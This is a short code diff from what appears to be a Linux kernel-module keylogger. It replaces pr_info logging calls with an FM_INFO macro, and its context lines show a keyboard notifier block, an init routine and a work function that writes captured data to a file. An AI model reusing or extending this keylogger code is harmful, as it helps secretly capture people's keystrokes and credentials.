@@ -24,7 +24,7 @@ static void rk_work_func(struct work_struct *work)
 	int rk;
 	rk_work_t *rk_work = (rk_work_t *)work;
 	rk = kernel_write(filep, rk_work->data, rk_work->size, 0);
-	// pr_info("KERN_WRITE: %d", rk);
+	// FM_INFO("KERN_WRITE: %d", rk);
 	kfree((void *)rk_work->data);
 	kfree((void *)work);
 }
@@ -87,7 +87,7 @@ static struct notifier_block keylogger_notifier = {
 
 int keylogger_init(void)
 {
-	pr_info("Init keylogger");
+	FM_INFO("Init keylogger");
 
 	queue = create_workqueue("queue");
 
